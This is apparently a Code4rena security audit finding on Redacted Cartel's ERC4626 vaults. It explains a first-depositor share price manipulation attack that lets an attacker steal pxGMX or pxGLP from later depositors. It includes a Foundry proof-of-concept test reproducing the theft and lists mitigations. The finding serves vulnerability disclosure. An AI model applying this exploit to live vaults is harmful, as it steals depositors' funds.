## Tags

- bug
- 3 (High Risk)
- primary issue
- selected for report
- upgraded by judge
- H-05

# [Underlying assets stealing in `AutoPxGmx` and `AutoPxGlp` via share price manipulation](https://github.com/code-423n4/2022-11-redactedcartel-findings/issues/275) 

# Lines of code

https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L156-L165
https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L167-L176


# Vulnerability details

## Impact
pxGMX and pxGLP tokens can be stolen from depositors in `AutoPxGmx` and `AutoPxGlp` vaults by manipulating the price of a share.
## Proof of Concept
ERC4626 vaults are subject to a share price manipulation attack that allows an attacker to steal underlying tokens from other depositors (this is a [known issue](https://github.com/transmissions11/solmate/issues/178) of Solmate's ERC4626 implementation). Consider this scenario (this is applicable to `AutoPxGmx` and `AutoPxGlp` vaults):
1. Alice is the first depositor of the `AutoPxGmx` vault;
1. Alice deposits 1 wei of pxGMX tokens;
1. in the `deposit` function ([PirexERC4626.sol#L60](https://github.com/code-423n4/2022-11-redactedcartel/blob/03b71a8d395c02324cb9fdaf92401357da5b19d1/src/vaults/PirexERC4626.sol#L60)), the amount of shares is calculated using the `previewDeposit` function:
    ```solidity
    function previewDeposit(uint256 assets)
        public
        view
        virtual
        returns (uint256)
    {
        return convertToShares(assets);
    }

    function convertToShares(uint256 assets)
        public
        view
        virtual
        returns (uint256)
    {
        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.

        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
    }
    ```
1. since Alice is the first depositor (totalSupply is 0), she gets 1 share (1 wei);
1. Alice then *sends* 9999999999999999999 pxGMX tokens (10e18 - 1) to the vault;
1. the price of 1 share is 10 pxGMX tokens now: Alice is the only depositor in the vault, she's holding 1 wei of shares, and the balance of the pool is 10 pxGMX tokens;
1. Bob deposits 19 pxGMX tokens and gets only 1 share due to the rounding in the `convertToShares` function: `19e18 * 1 / 10e18 == 1`;
1. Alice redeems her share and gets a half of the deposited assets, 14.5 pxGMX tokens (less the withdrawal fee);
1. Bob redeems his share and gets only 14.5 pxGMX (less the withdrawal fee), instead of the 19 pxGMX he deposited.

```solidity
// test/AutoPxGmx.t.sol
function testSharePriceManipulation_AUDIT() external {
    address alice = address(0x31337);
    address bob = address(0x12345);
    vm.label(alice, "Alice");
    vm.label(bob, "Bob");

    // Resetting the withdrawal fee for cleaner amounts.
    autoPxGmx.setWithdrawalPenalty(0);

    vm.startPrank(address(pirexGmx));        
    pxGmx.mint(alice, 10e18);
    pxGmx.mint(bob, 19e18);
    vm.stopPrank();

    vm.startPrank(alice);
    pxGmx.approve(address(autoPxGmx), 1);
    // Alice deposits 1 wei of pxGMX and gets 1 wei of shares.
    autoPxGmx.deposit(1, alice);
    // Alice sends 10e18-1 of pxGMX and sets the price of 1 wei of shares to 10e18 pxGMX.
    pxGmx.transfer(address(autoPxGmx), 10e18-1);
    vm.stopPrank();

    vm.startPrank(bob);
    pxGmx.approve(address(autoPxGmx), 19e18);
    // Bob deposits 19e18 of pxGMX and gets 1 wei of shares due to rounding and the price manipulation.
    autoPxGmx.deposit(19e18, bob);
    vm.stopPrank();

    // Alice and Bob redeem their shares.           
    vm.prank(alice);
    autoPxGmx.redeem(1, alice, alice);
    vm.prank(bob);
    autoPxGmx.redeem(1, bob, bob);

    // Alice and Bob both got 14.5 pxGMX.
    // But Alice deposited 10 pxGMX and Bob deposited 19 pxGMX – thus, Alice stole pxGMX tokens from Bob.
    // With withdrawal fees enabled, Alice would've been penalized more than Bob
    // (14.065 pxGMX vs 14.935 pxGMX tokens withdrawn, respectively),
    // but Alice would've still gotten more pxGMX that she deposited.
    assertEq(pxGmx.balanceOf(alice), 14.5e18);
    assertEq(pxGmx.balanceOf(bob), 14.5e18);
}
```

## Tools Used
Manual review
## Recommended Mitigation Steps
Consider either of these options:
1. In the `deposit` function of `PirexERC4626`, consider requiring a reasonably high minimal amount of assets during first deposit. The amount needs to be high enough to mint many shares to reduce the rounding error and low enough to be affordable to users.
1. On the first deposit, consider minting a fixed and high amount of shares, irrespective of the deposited amount.
1. Consider seeding the pools during deployment. This needs to be done in the deployment transactions to avoiding front-running attacks. The amount needs to be high enough to reduce the rounding error.
1. Consider sending first 1000 wei of shares to the zero address. This will significantly increase the cost of the attack by forcing an attacker to pay 1000 times of the share price they want to set. For a well-intended user, 1000 wei of shares is a negligible amount that won't diminish their share significantly.